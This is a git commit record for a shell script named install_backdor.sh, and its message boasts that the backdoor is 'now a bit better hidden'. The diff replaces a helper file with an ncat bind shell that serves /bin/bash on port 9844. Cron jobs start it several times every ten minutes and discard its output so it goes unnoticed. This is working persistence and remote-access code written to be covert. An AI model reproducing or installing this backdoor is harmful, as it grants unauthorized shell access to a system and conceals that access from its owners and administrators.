705fc839d6b7c670b9e8bdc796e2dead8d4963a9
a-enz <andi_enz@msn.com>
2017-11-17 19:05:00 +0100

    Backdoor now a bit better hidden. No script file, everything in cron

--- System/Backup/install_backdor.sh
+++ System/Backup/install_backdor.sh
@@ -1,33 +1,19 @@
-SCRIPT=.backup_bk.sh
-PORT=9844
-IDLE_TIME=10 # seconds
-
-
-## SCRIPT
-echo "Creating script that binds a shell to port $PORT"
-touch $SCRIPT
-chmod u+x $SCRIPT
-
-# write the script
-# opens a port with ncat for a certain time
-cat << EOF > $SCRIPT
-ncat -l $PORT -i $IDLE_TIME -v -e /bin/bash
-EOF
-
+COMMAND="ncat -l 9844 -i 10 -v -e /bin/bash"
 
 ## INSTALL CRON
 # create cronjob to activate the script in certain interals:
 # repeats every 10 minutes, during those 10min the pattern is:
 # at minute: 0, 2, 3, 6, 8
 
-echo "10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron
-echo "2-59/10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron
-echo "3-59/10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron
-echo "6-59/10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron
-echo "8-59/10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron
+echo "10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "2-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "3-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "6-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "8-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+
 
 # Check if cronjob already installed
-if crontab -l | grep -q $SCRIPT ; then
+if crontab -l | grep -q '$COMMAND' ; then
 	echo "Crontab for $SCRIPT already installed, skipping"
 else
 	echo "Installing cronjobs"
